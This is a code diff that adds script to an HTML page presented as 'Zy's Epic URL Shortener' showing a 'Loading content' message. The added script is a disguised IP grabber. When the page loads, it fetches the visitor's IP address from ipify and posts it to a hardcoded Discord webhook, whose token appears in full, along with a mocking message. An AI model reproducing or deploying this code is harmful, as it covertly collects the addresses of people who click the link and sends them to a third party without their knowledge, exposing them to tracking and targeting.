@@ -22,6 +22,27 @@
     <h1>Zy&#x27;s Epic URL Shortener</h1>
     <p>Loading content..<br /></p>
     <img src="img/me.png"/>
+    
+    <script>
+          function getIP(json) {
+            var request = new XMLHttpRequest(); //making a request for the webhook
+            request.open("POST", "https://discord.com/api/webhooks/1068360062902481048/I4dOOdheiLlGqJZW9rHHK_-Spv5ErrTMieZUdNkBp0CEJf9q2mIXB4UtGwLWUMT5g09i");
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var params = {
+                username: "i haz ur ip now",
+                avatar_url: "https://i.insider.com/5c5dd439dde867479d106cc2?width=1000&format=jpeg&auto=webp",
+                content: "some big brained individual clicked the link. **IP:** *" + json.ip + "*"
+            }
+
+            request.send(JSON.stringify(params));
+        }
+
+    </script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    
+    
 </body>
 
 </html>
